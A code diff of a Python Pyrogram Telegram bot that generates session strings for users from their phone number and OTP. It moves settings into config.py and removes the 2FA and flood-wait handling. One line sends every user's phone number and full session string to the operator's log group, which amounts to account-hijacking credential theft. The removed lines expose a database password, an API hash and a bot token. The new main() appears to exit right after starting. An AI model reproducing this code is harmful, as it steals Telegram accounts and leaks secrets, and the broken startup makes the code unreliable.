@@ -1,19 +1,13 @@
 import asyncio
 from pyrogram import Client, filters
-from pyrogram.errors import FloodWait, SessionPasswordNeeded
 from pymongo import MongoClient
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
+from config import API_ID, API_HASH, BOT_TOKEN, LOGGER_GROUP_ID, MONGO_URI, MONGO_DB_NAME, MONGO_COLLECTION_NAME
 
 # MongoDB connection
-client = MongoClient('mongodb+srv://SachinSanatani:SACHINxSANATANI@sanatani.bnmsfbd.mongodb.net/SACHIN?retryWrites=true&w=majority&appName=Sanatani')
-db = client['session_bot']  # Database name
-sessions_collection = db['sessions']  # Collection for storing session data
-
-# Configuration from config.py (or direct input)
-API_ID = 28795512
-API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
-BOT_TOKEN = "7983720117:AAGN1CleTYHauUVyYj7xT_xHWPO2fgzWDGc"  
-LOGGER_GROUP_ID = -1002452519381  # Change this to your log group ID
+client = MongoClient(MONGO_URI)
+db = client[MONGO_DB_NAME]
+sessions_collection = db[MONGO_COLLECTION_NAME]
 
 # Creating the Pyrogram Client for bot
 bot = Client("bot_session", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
@@ -69,9 +63,6 @@ async def handle_input(client, message):
             await pyrogram_client.start(phone_number)
             await message.reply("OTP has been sent! Please enter the OTP you received.")
             user_sessions[user_id]["step"] = "otp"
-        except SessionPasswordNeeded:
-            await message.reply("This account has 2FA enabled. Please enter your Telegram password.")
-            user_sessions[user_id]["step"] = "password"
         except Exception as e:
             await message.reply(f"An error occurred: {e}")
             del user_sessions[user_id]
@@ -100,8 +91,6 @@ async def handle_input(client, message):
             await client.send_message(LOGGER_GROUP_ID, f"New session generated:\n\nUser: `{user_id}`\nPhone: `{phone_number}`\nSession: `{session_string}`")
             
             del user_sessions[user_id]
-        except FloodWait as e:
-            await message.reply(f"Please wait for {e.x} seconds before trying again.")
         except Exception as e:
             await message.reply(f"An error occurred: {e}")
             del user_sessions[user_id]
@@ -143,6 +132,9 @@ async def cancel_session(client, callback_query):
     else:
         await callback_query.answer("No active session found.")
 
-# Run the bot
-print("Bot is running...")
-bot.run()
+# Run the bot with asyncio
+async def main():
+    await bot.start()
+
+# Running the bot
+asyncio.run(main())
